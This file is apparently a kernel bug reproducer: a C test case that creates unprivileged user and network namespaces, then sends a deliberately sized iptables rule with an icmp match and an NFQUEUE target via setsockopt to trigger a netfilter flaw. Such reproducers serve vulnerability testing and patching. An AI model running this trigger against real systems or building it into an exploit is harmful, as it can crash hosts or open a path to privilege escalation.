/*
 * gcc -m32 -static -o test1 test_case1.c
 * ./test1
 
 */
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <linux/netfilter_ipv4/ip_tables.h>

int main(int argc, char *argv[]) {
  int s;

  if (unshare(CLONE_NEWUSER) != 0) err(1, "unshare(CLONE_NEWUSER)");
  if (unshare(CLONE_NEWNET) != 0) err(1, "unshare(CLONE_NEWNET)");

  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) err(1, "socket");

  struct {
    struct ipt_replace replace;
    struct ipt_entry entry;
    struct xt_entry_match match;
    struct xt_entry_target target;
  } data = {0};

  data.replace.num_counters = 1;
  data.replace.num_entries = 1;
  data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
                        sizeof(data.target));

  data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
                             sizeof(data.target));
  data.entry.target_offset =
      (sizeof(data.entry) + sizeof(data.match));

  data.match.u.user.match_size = (sizeof(data.match));
  strcpy(data.match.u.user.name, "icmp");
  data.match.u.user.revision = 0;

  data.target.u.user.target_size = sizeof(data.target);
  strcpy(data.target.u.user.name, "NFQUEUE");
  data.target.u.user.revision = 1;

  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
    if (errno == ENOPROTOOPT)
      err(1, "Error: ip_tables module is not loaded");
  }

  close(s);

  return 0;
}